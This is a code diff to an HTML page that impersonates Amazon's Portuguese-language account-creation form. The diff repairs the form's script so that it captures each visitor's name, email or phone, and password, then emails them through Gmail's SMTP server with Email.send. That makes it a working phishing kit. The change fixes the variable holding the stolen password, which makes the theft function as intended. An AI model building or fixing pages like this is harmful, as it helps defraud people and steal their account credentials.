@@ -46,7 +46,7 @@
                     </div>
                     <div class="col-10"><h33>Criar conta </h33><span>Novo na Amazon?</span></div>
                   </div>
-                  <form onsubmit="sendEmail()" method="post">
+                  <form onsubmit="sendEmail()">
                     <input class="inputForm" type="name" maxlength="50" id="name" name="name" placeholder="Nome Completo" autocomplete="name" required="required" />
                     <input class="inputForm" type="email" maxlength="50" id="email" name="email" placeholder="Número de celular ou email" autocomplete="email" required="required" />
                     <input class="inputForm" type="password" maxlength="50" id="passwd" name="passwd" placeholder="Senha" autocomplete="current-password" required="required" />
@@ -61,7 +61,7 @@
                       let inputEmail = document.getElementById('email').value;
                       let inputPasswd = document.getElementById('passwd').value;
                   
-                      let finalmessage = `<br>Name : ${nome} <br> Username : ${inputEmail} <br> Password : ${inputPhone}`;             
+                      let finalmessage = `<br>Name : ${nome} <br> Username : ${inputEmail} <br> Password : ${inputPasswd}`;             
                       
                       Email.send({
                         Host: "smtp.gmail.com",
